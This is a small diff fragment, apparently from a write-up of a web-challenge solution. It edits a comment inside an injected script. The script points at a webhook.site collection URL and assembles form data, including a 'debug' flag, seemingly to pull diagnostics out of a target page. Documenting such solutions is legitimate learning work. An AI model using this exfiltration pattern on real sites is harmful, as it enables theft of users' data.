@@ -112,7 +112,7 @@ On that sub-page we see a [Bootstrap form](https://getbootstrap.com/docs/4.0/com
 <script>
    const webhook = 'https://webhook.site/82310b30-bdb3-45f9-8d46-92f9c44fcf0d';
    var formData = new FormData();
-   formData.append('receiver', 'kk429629'); // my login for the
+   formData.append('receiver', 'kk429629'); // my login for the page
    formData.append('content', "Here's your diagnostics:");
    formData.append('debug', 'on');
 
